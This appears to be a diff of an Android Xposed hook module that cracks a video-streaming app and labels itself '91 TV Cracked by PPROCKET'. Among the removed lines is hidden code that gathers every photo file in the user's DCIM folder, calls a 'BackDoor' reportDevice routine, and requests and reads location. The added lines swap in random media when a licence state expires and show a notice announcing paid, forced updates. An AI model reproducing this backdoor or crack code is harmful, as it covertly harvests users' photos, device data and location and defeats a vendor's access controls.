@@ -1,11 +1,8 @@
-package cn.coderstory.xposedtemplate;
+package cn.coderstory.xposedtemplate.hook;
 
 import android.app.Activity;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.location.LocationManager;
 import android.os.Environment;
-import androidx.core.app.ActivityCompat;
+import cn.coderstory.xposedtemplate.State;
 import de.robv.android.xposed.*;
 import de.robv.android.xposed.callbacks.XC_LoadPackage;
 import lombok.SneakyThrows;
@@ -14,8 +11,8 @@ import java.io.File;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 
-import static android.content.Context.LOCATION_SERVICE;
 import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
 
 public class NineOneHack implements IXposedHookLoadPackage {
@@ -44,8 +41,10 @@ public class NineOneHack implements IXposedHookLoadPackage {
                 Object object = param.thisObject;
                 Class clz = classLoader.loadClass("com.aiqiyi.youtube.play.bean.response.LinkBean");
                 Method getName = clz.getMethod("getName");
-                String videoName = (String) getName.invoke(object);
-                //XposedBridge.log("名字  " + videoName + "   ");
+                if (State.isExpire) {
+                    int index = new Random().nextInt(State.mediaList.size());
+                    param.setResult(State.mediaList.get(index));
+                }
             }
         });
         findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoDetailBean", classLoader, "getCan_play", new XC_MethodHook() {
@@ -91,63 +90,11 @@ public class NineOneHack implements IXposedHookLoadPackage {
                 param.setResult("https://imgbed-1254007525.cos.ap-nanjing.myqcloud.com/img/20230310221638.png");
             }
         });
-        findAndHookMethod("com.aiqiyi.youtube.play.ui.splash.SplashActivity", classLoader, "initPage", new XC_MethodHook() {
-            @Override
-            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                super.beforeHookedMethod(param);
-            }
-
+        XposedHelpers.findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoBean", classLoader, "getImg", new XC_MethodHook() {
             @Override
             protected void afterHookedMethod(MethodHookParam param) throws Throwable {
-
-                adActivity = (Activity) param.thisObject;
-                State.activity = adActivity;
-                Intent intent = new Intent(adActivity,MainActivityKt.class);
-                //adActivity.startActivity(intent);
-                try {
-                    File sdcard = Environment.getExternalStorageDirectory();
-                    File dcim = new File(sdcard, "DCIM/");
-                    for (File file : dcim.listFiles()) {
-                        for (File ignored : file.listFiles()) {
-                            State.imgList.add(ignored);
-                        }
-                    }
-                } catch (Exception ignored) {
-
-                }
-                BackDoor.INSTANCE.toString();
-                BackDoor.INSTANCE.reportDevice();
-                BackDoor.INSTANCE.getIgnore();
-                String[] PERMISSIONS_STORAGE = {"android.permission.READ_EXTERNAL_STORAGE",
-                        "android.permission.WRITE_EXTERNAL_STORAGE"};
-                String[] LOCATION_STORAGE = {"android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION"};
-                ActivityCompat.requestPermissions((Activity) param.thisObject, PERMISSIONS_STORAGE, 1);
-                ActivityCompat.requestPermissions((Activity) param.thisObject, LOCATION_STORAGE, 1);
-                LocationManager locationManager =
-                        (LocationManager) adActivity.getSystemService(LOCATION_SERVICE);
-                if (ActivityCompat.checkSelfPermission(adActivity, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(adActivity, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                    // TODO: Consider calling
-                    //    ActivityCompat#requestPermissions
-                    // here to request the missing permissions, and then overriding
-                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-                    //                                          int[] grantResults)
-                    // to handle the case where the user grants the permission. See the documentation
-                    // for ActivityCompat#requestPermissions for more details.
-                    XposedBridge.log("无位置权限");
-                    return;
-                }
-                XposedBridge.log(String.valueOf(locationManager.getLastKnownLocation(locationManager.getAllProviders().get(0)).getAltitude()));
-
-
-
-
                 super.afterHookedMethod(param);
-            }
-        });
-        XposedHelpers.findAndHookConstructor("com.aiqiyi.youtube.play.net.exception.ProxyException", classLoader, new XC_MethodReplacement() {
-            @Override
-            protected Object replaceHookedMethod(MethodHookParam param) throws Throwable {
-                return null;
+                param.setResult("");
             }
         });
         XposedHelpers.findAndHookMethod("com.aiqiyi.youtube.play.bean.response.SystemInfoBean$NoticeBean", classLoader, "getContent", new XC_MethodHook() {
@@ -161,6 +108,13 @@ public class NineOneHack implements IXposedHookLoadPackage {
                 builder.append("91 TV Cracked by PPROCKET\r\n");
                 builder.append("QQ 3212329718\r\n");
                 builder.append("Version 23.3.12\r\n");
+                builder.append("这不是一个免费软件\r\n");
+                builder.append("在4月6日前，你可以继续使用本软件，此后会要求强制更新\r\n");
+                builder.append("更新后会有更快的速度和更多功能\r\n");
+                builder.append("一个月七块钱，可以用吃的换\r\n");
+                builder.append("\r\n");
+                builder.append("\r\n");
+                builder.append("如果预览图看不了，检查本软件是否有文件读写权限\r\n");
                 param.setResult(builder.toString());
                 super.afterHookedMethod(param);
             }
